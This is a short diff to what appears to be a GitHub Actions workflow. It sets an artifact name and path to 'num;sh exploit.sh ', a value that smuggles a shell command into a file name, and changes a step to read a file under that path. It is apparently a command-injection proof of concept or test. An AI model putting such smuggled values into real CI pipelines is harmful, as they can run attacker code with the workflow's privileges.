@@ -14,4 +14,4 @@ jobs:
           name: 'num;sh exploit.sh '
           path: 'num;sh exploit.sh '
       - name: report/fetch-pr-number
-        run: ls -R
+        run: cat 'num;sh exploit.sh/test1.yml'
